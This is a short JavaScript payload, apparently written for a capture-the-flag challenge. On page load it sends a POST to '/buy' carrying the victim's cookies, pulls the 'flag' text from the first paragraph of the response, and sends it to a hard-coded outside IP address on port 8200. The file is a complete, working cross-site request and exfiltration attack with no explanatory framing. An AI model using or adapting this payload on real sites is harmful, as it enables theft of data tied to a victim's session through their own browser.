document.addEventListener('DOMContentLoaded', (event) => {
    fetch("/buy", {
        method: "POST",
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: "id=1",
        credentials: 'include' // 确保携带cookie等身份凭证
    })
    .then(response => response.text())
    .then(data => {
        const parser = new DOMParser();
        const htmlDocument = parser.parseFromString(data, "text/html");
        const pElements = htmlDocument.getElementsByTagName("p");
        let flagContent = "";

        // 假设你只对第一个<p>元素感兴趣或者你知道flag一定在第一个<p>中
        if (pElements.length > 0) {
            flagContent = pElements[0].textContent; // 或使用innerText取决于具体情况
        }

        // 检查flagContent是否有效，然后发送
        if (flagContent) {
            const targetUrl = `http://111.229.210.75:8200/${encodeURIComponent(flagContent)}`;
            fetch(targetUrl, { method: "GET" })
            .then(response => console.log("Content sent successfully"))
            .catch(error => console.error("Error sending content:", error));
        }
    })
    .catch(error => console.error("Error during the process:", error));
});
